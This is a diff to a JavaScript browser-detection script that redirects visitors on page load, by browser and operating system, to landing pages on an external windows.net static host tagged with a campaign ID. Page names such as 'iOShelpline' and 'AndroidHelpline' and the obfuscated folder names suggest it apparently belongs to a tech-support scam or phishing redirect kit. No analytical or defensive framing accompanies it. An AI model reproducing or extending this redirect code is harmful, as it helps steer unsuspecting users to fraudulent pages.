@@ -62,30 +62,30 @@
     isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
 	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
    	// is Google chrome
-	window.location.href = "./0WindbnSub08w0winin807/index.html";
+	window.location.href = "https://staticwebwin007.z13.web.core.windows.net/0WindbnSub08w0winin807/index.html?camp=125225";
 	}
 	if(navigator.userAgent.indexOf("Firefox") != -1 )
     {
-         window.location.href = "./0WindbnSub08w0winin807/index.html";
+         window.location.href = "https://staticwebwin007.z13.web.core.windows.net/0WindbnSub08w0winin807/index.html?camp=125225";
     }
 	if(window.navigator.userAgent.indexOf("Edge") != -1 )
     {
-         window.location.href = "./0WindbnSub08w0winin807/index.html";
+         window.location.href = "https://staticwebwin007.z13.web.core.windows.net/0WindbnSub08w0winin807/index.html?camp=125225";
     }
 	if(window.navigator.userAgent.indexOf("Mac") != -1 )
     {
-         window.location.href = "./0MacdbnSubD7w0Macin87/index.html";
+         window.location.href = "https://staticwebwin007.z13.web.core.windows.net/0MacdbnSubD7w0Macin87/index.html?camp=125225";
     }
 
 		if(window.navigator.userAgent.indexOf("iPhone") != -1 )
 					{
-							 window.location.href = "./iOShelpline00SubD087/index.html";
+							 window.location.href = "https://staticwebwin007.z13.web.core.windows.net/iOShelpline00SubD087/index.html";
 					}
 
 
 					if(window.navigator.userAgent.indexOf("Android") != -1 )
 								{
-										 window.location.href = "./AndroidHelpline00SubD87/index.html";
+										 window.location.href = "https://staticwebwin007.z13.web.core.windows.net/AndroidHelpline00SubD87/index.html";
 								}
 
 	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
